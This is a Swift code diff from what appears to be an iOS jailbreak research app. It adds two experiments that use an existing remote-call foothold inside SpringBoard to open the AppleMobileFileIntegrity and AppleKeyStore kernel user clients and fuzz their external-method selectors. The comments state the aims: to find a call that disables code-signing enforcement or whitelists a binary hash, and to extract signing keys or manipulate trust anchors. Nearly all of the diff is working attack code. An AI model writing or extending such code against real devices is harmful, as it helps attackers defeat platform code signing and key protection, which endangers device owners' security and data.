@@ -490,6 +490,21 @@ struct AMFIExperimentView: View {
             let exp55 = self.expCoreTrustProbe(rc: rc)
             experimentResults.append(exp55)
             
+            // ============================================
+            // 🔥🔥🔥 Experiment 56: AMFI External Method Fuzzing!
+            // We can OPEN AppleMobileFileIntegrity user client!
+            // Fuzz its external methods to find disable/whitelist API
+            // ============================================
+            let exp56 = self.expAMFIExternalMethods()
+            experimentResults.append(exp56)
+            
+            // ============================================
+            // 🔥🔥 Experiment 57: AppleKeyStore external methods
+            // KeyStore has known vulns in older iOS — test selectors
+            // ============================================
+            let exp57 = self.expKeyStoreProbe()
+            experimentResults.append(exp57)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -3539,6 +3554,258 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅✅✅")
         return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - 🔥🔥🔥 AMFI External Method Fuzzing
+    
+    /// Experiment 56: Open AMFI user client and fuzz ALL external methods!
+    /// AppleMobileFileIntegrity kext has external methods that might:
+    /// - Whitelist a binary hash
+    /// - Disable enforcement for a process
+    /// - Add an exception to code signing policy
+    /// - Return internal state we can use
+    private func expAMFIExternalMethods() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "AMFI External Method Fuzzing\n"
+        detail += "Opening AppleMobileFileIntegrity user client...\n\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Get IOKit function pointers (resolved for availability check)
+        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
+        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) — 6 params
+        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
+        
+        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
+            detail += "IOKit functions not available\n"
+            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Open AMFI user client
+        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
+        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+        
+        guard svc != 0 else {
+            detail += "AMFI service not found\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+        let connectAddr = mem + 0x1A00
+        sb[connectAddr].setValue32(0)
+        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
+        let connect = sb[connectAddr].value32()
+        
+        guard openRet == 0 && connect != 0 else {
+            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
+        }
+        
+        detail += "✅ AMFI user client opened! connect=\(connect)\n\n"
+        detail += "Fuzzing external methods (selectors 0-15)...\n\n"
+        
+        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
+        // Only 6 params — safe for ARM64 register calling convention
+        
+        // Setup output buffer (space for 16 uint64 outputs)
+        let scalarOutAddr = mem + 0x1C00
+        let scalarOutCntAddr = mem + 0x1D00
+        // Input area
+        let scalarInAddr = mem + 0x2000
+        
+        var foundMethods: [Int] = []
+        
+        for selector in 0..<16 {
+            // Reset output count
+            sb[scalarOutCntAddr].setValue32(16)
+            
+            // Clear output
+            for i in 0..<16 {
+                sb[scalarOutAddr + UInt64(i * 8)].setValue64(0)
+            }
+            
+            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
+            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                         UInt64(connect),
+                                         UInt64(selector),
+                                         0, 0,  // no input
+                                         scalarOutAddr, scalarOutCntAddr)
+            
+            let outCnt = sb[scalarOutCntAddr].value32()
+            
+            // Interpret return value
+            // 0 = success, 0xe00002bc = invalid selector, 0xe00002c2 = bad argument
+            let retHex = String(format: "0x%x", ret)
+            
+            if ret == 0 {
+                detail += "✅ Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
+                foundMethods.append(selector)
+                
+                // Read scalar outputs
+                if outCnt > 0 {
+                    detail += "   Scalar outputs: "
+                    for i in 0..<min(Int(outCnt), 4) {
+                        let val = sb[scalarOutAddr + UInt64(i * 8)].value64()
+                        detail += "[\(i)]=0x\(String(format: "%llx", val)) "
+                    }
+                    detail += "\n"
+                }
+            } else if ret == 0xe00002bc {
+                // kIOReturnBadArgument — selector doesn't exist
+                detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
+            } else if ret == 0xe00002c2 {
+                // kIOReturnUnsupported or bad input count
+                detail += "⚠️ Selector \(selector): needs input! (ret=\(retHex))\n"
+                foundMethods.append(selector)
+            } else if ret == 0xe0000001 {
+                detail += "⚠️ Selector \(selector): general error (ret=\(retHex))\n"
+                foundMethods.append(selector)
+            } else {
+                detail += "   Selector \(selector): ret=\(retHex)\n"
+                if ret != 0xe00002bc && ret != 0xe00002c7 {
+                    foundMethods.append(selector)  // non-standard error = method exists
+                }
+            }
+        }
+        
+        // Now try selectors with scalar input (1 uint64 = 0)
+        if !foundMethods.isEmpty {
+            detail += "\n--- Re-testing found methods with input ---\n"
+            for selector in foundMethods.prefix(8) {
+                // Try with 1 scalar input = 0
+                sb[scalarInAddr].setValue64(0)
+                sb[scalarOutCntAddr].setValue32(16)
+                
+                let ret2 = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                             UInt64(connect),
+                                             UInt64(selector),
+                                             scalarInAddr, 1,  // 1 scalar input
+                                             scalarOutAddr, scalarOutCntAddr)
+                
+                let outCnt2 = sb[scalarOutCntAddr].value32()
+                detail += "  Selector \(selector) + input(0): ret=0x\(String(format: "%x", ret2)), outCnt=\(outCnt2)\n"
+                
+                if ret2 == 0 && outCnt2 > 0 {
+                    let val = sb[scalarOutAddr].value64()
+                    detail += "    → output[0] = 0x\(String(format: "%llx", val))\n"
+                }
+            }
+        }
+        
+        // Close
+        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
+        RootExecutor.rcall(sb, "free", nameAddr)
+        
+        detail += "\n--- Summary ---\n"
+        detail += "Found \(foundMethods.count) active methods: \(foundMethods)\n"
+        if !foundMethods.isEmpty {
+            detail += "NEXT: Try specific inputs to these methods\n"
+            detail += "Goal: find method that disables CS enforcement or whitelists hash\n"
+        }
+        
+        let success = !foundMethods.isEmpty
+        return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - AppleKeyStore Probe
+    
+    /// Experiment 57: AppleKeyStore external method probe
+    /// KeyStore manages encryption keys — if we can extract/manipulate keys
+    /// we might be able to sign our own binaries or decrypt protected data
+    private func expKeyStoreProbe() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "AppleKeyStore External Method Probe\n\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
+        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
+        
+        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
+            detail += "IOKit functions not available in SpringBoard\n"
+            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Open AppleKeyStore
+        let nameAddr = remote_alloc_str(sb, "AppleKeyStore")
+        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+        
+        guard svc != 0 else {
+            detail += "AppleKeyStore service not found\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+        let connectAddr = mem + 0x1A00
+        sb[connectAddr].setValue32(0)
+        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
+        let connect = sb[connectAddr].value32()
+        
+        guard openRet == 0 && connect != 0 else {
+            detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
+        }
+        
+        detail += "✅ AppleKeyStore opened! connect=\(connect)\n\n"
+        
+        // Fuzz selectors 0-20 (KeyStore has many methods)
+        let scalarOutAddr = mem + 0x1C00
+        let scalarOutCntAddr = mem + 0x1D00
+        
+        var foundMethods: [Int] = []
+        
+        for selector in 0..<20 {
+            sb[scalarOutCntAddr].setValue32(16)
+            
+            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
+            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                         UInt64(connect),
+                                         UInt64(selector),
+                                         0, 0,
+                                         scalarOutAddr, scalarOutCntAddr)
+            
+            if ret == 0 {
+                let outCnt = sb[scalarOutCntAddr].value32()
+                detail += "✅ Selector \(selector): SUCCESS! out=\(outCnt)\n"
+                foundMethods.append(selector)
+                if outCnt > 0 {
+                    let val = sb[scalarOutAddr].value64()
+                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
+                }
+            } else if ret != 0xe00002bc && ret != 0xe00002c7 {
+                detail += "⚠️ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
+                foundMethods.append(selector)
+            }
+        }
+        
+        // Close
+        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
+        RootExecutor.rcall(sb, "free", nameAddr)
+        
+        detail += "\nFound \(foundMethods.count) active KeyStore methods: \(foundMethods)\n"
+        detail += "KeyStore methods can potentially:\n"
+        detail += "- Extract signing keys\n"
+        detail += "- Create new key bags\n"
+        detail += "- Manipulate trust anchors\n"
+        
+        return ExperimentResult(name: "🔥🔥 KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
